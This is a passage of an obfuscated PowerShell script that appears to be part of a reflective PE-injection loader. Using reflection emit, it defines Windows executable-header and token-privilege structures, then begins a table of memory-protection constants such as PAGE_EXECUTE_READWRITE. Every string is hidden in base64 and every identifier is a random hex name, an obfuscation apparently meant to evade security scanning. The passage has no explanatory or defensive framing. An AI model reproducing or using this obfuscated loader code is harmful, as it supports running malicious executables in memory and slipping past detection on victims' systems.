		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${11ee5c280b4b4c908e776fc942271fb9}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${e394ae98ebd049c998988abb900068c7} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${e394ae98ebd049c998988abb900068c7}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 64)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${d1a5696d40f341b2bb129734f447a983} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${441cdca211604853a528a6c73d4aa886} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${3fc97b1d172c425c8366d16d93ec9ec1} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${41b9e4c7da934b56bfb86a2bc435074f} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${d62dfb307105443cae2691a91b9da16f}, ${441cdca211604853a528a6c73d4aa886}, ${3fc97b1d172c425c8366d16d93ec9ec1}, @([Int32] 4))
		${d1a5696d40f341b2bb129734f447a983}.SetCustomAttribute(${41b9e4c7da934b56bfb86a2bc435074f})
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${a32997812089440192c9734b5b40c0b7} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${441cdca211604853a528a6c73d4aa886} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${41b9e4c7da934b56bfb86a2bc435074f} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${d62dfb307105443cae2691a91b9da16f}, ${441cdca211604853a528a6c73d4aa886}, ${3fc97b1d172c425c8366d16d93ec9ec1}, @([Int32] 10))
		${a32997812089440192c9734b5b40c0b7}.SetCustomAttribute(${41b9e4c7da934b56bfb86a2bc435074f})
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${205aa64baf8142429a16ddad71af0d99} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${205aa64baf8142429a16ddad71af0d99}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 40)
		${e643a8ec83c24f5c96d0f501970a3670} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${441cdca211604853a528a6c73d4aa886} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${41b9e4c7da934b56bfb86a2bc435074f} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${d62dfb307105443cae2691a91b9da16f}, ${441cdca211604853a528a6c73d4aa886}, ${3fc97b1d172c425c8366d16d93ec9ec1}, @([Int32] 8))
		${e643a8ec83c24f5c96d0f501970a3670}.SetCustomAttribute(${41b9e4c7da934b56bfb86a2bc435074f})
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${63e28cc0f741477ebf5f514d2cc7a329} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${63e28cc0f741477ebf5f514d2cc7a329}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 8)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${c3fdc185918546c3b4c486461bd06f23} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${c3fdc185918546c3b4c486461bd06f23}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 20)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${ae6782382f3a4aac929773b2d5db69b2} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${ae6782382f3a4aac929773b2d5db69b2}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 40)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${50f412cee047407a8c030dd3c204da86} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${50f412cee047407a8c030dd3c204da86}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 8)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${da47fb5487b14158a8a039128e3d51b4} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${da47fb5487b14158a8a039128e3d51b4}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 12)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${da47fb5487b14158a8a039128e3d51b4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${4559e5413e544871a9de9fc4205794e3} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${4559e5413e544871a9de9fc4205794e3}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 16)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${4559e5413e544871a9de9fc4205794e3}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${721061d94990417ea4da21b62e22775f} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${721061d94990417ea4da21b62e22775f}
		return $Win32Types
	}
	Function b3df47e05c264da9935d94ccf1848c18
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
